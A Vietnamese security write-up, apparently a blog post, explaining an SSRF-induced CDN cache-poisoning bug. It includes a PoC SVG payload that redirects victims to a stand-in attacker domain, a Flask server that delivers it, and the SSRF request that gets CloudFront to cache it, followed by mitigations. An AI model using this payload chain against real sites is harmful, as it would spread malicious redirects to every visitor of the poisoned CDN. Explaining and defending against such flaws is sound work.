---
date: 2025-05-04 10:15:00
---

# SSRF‑induced Cache Poisoning Logic Bug

![Flow Diagram](https://mermaid.ink/img/pako:eNp9kV9PwjAUxb9Kcw1viIx_gz6YwBCMYmLEoHHzoWyXrbFrsXQGJfvudgUMJsY-9d7fOec2tzuIVYJAoVbbcckNJbtIEhKByTDHCKi9JrhihTAR1E_QgmnOlgI3lcZ5KrRS0sz518Ho9dbbg-sIn5CnmdnjpRLJCTa4NYESSu_pWdOdE4HgEv8VYJLijC1RjFj8lmpVSJtPrXLlTgSVsIxkWdZqkUw1W2dk9lA1h-GCx488fyXn55fkJnzA9wI3Zl-OwkCoIplo-_7XSn0VzlF_oCZDY-wk1HvdbXjHBI-5Kjbkd0BlGrlrcLC6nMC1xuG9VttPMkETZ2TMDHNw7OB1GExIwOIMyU-4w9cOT09GzhfTi-e7maNTR4dQh1TzBKjRBdYhR52zqoQ_Ppnpt2pBpfWsmXxRKj_a7CLTDOiKiY2tinXCDI45s_vLf7oaZYI6sCs3QNt-14UA3cEWaN9r9Pp-p9dp-l3fG3gWflpRq9Xo9Hyv3ep3297A98s6fLmpzUbf75bfvnzLWw)

---

## 1. Nguyên lý lỗi

1. **SSRF**: Attacker cung cấp URL của payload SVG/XML (ví dụ `poc.xml`) vào endpoint proxy.  
2. **Fetch & Cache**: Server fetch về và trả header `Content-Type: image/svg+xml`, khiến CloudFront **tự động cache** response.  
3. **Logic Bug**: Sau khi cache, mọi request tiếp theo đều trả payload cũ từ CDN — **payload attacker lan tỏa** đến toàn bộ người dùng.

![SSRF Fetch & Cache](/posts/image-post/cache-poisoning-via-fetching-data/1.jpg)

---

## 2. Phân biệt với Cache‑Poisoning “thông thường”

| Cache‑poisoning Thông thường       | SSRF‑Logic Bug (Biến thể)     |
|------------------------------------|-------------------------------|
| Client gửi payload trực tiếp       | Payload qua SSRF intermediary |
| CDN cache trực tiếp response       | CDN cache response SSRF trả về|
| Điều khiển bằng header (Host/Vary) | Lỗi flow “Fetch → Cache → Serve”|

---

## 3. Proof‑of‑Concept

### 3.1 Payload SVG/XML (`poc.xml`)

```xml
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" version="1.1">
  <foreignObject width="100%" height="100%">
    <body xmlns="http://www.w3.org/1999/xhtml">
      <meta http-equiv="refresh" content="0; url=https://your-attacker-domain.com/" />
    </body>
  </foreignObject>
</svg>
```

### 3.2 Python Flask Demo

```python
from flask import Flask, make_response
import os

app = Flask(__name__)

@app.route('/poc.xml')
def serve_svg_as_xml():
    file_path = os.path.join(os.getcwd(), 'poc.xml')
    if os.path.exists(file_path):
        with open(file_path, 'rb') as f:
            resp = make_response(f.read())
            resp.headers.set('Content-Type', 'image/svg+xml')
            return resp
    return "File poc.xml not found!", 404

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5505, debug=False)
```

![Flask Demo](/posts/image-post/cache-poisoning-via-fetching-data/6.png)

### 3.3 Kết quả trên CloudFront

- Gửi request đến SSRF endpoint:
  ```http
  GET /media?u=http://VPS:5505/poc.xml HTTP/2
  Host: vuln.example.com
  ```
- Response header trả về có:
  ```
  X-Cache: Hit from cloudfront
  Age: 5
  ```
  → Chứng tỏ payload đã được cache.

![CloudFront Hit](/posts/image-post/cache-poisoning-via-fetching-data/7.jpg)

---

## 4. Hậu quả

- Payload attacker “đóng băng” trong CDN, **tất cả user** đều nhận nội dung độc hại mà không cần trigger SSRF lại.  
- Cho phép **tấn công hàng loạt**: redirect nạn nhân, XSS, download file độc hại…

---

## 5. Mitigation

1. **Whitelist** domain/URL khi server fetch.  
2. **Validate**  sanitize `Content-Type` của response trước khi trả về CDN.  
3. Thêm header `Cache-Control: no-store` hoặc `Vary: Origin` cho SSRF endpoint.  
4. **Rate-limit** và giới hạn phạm vi URL có thể fetch.
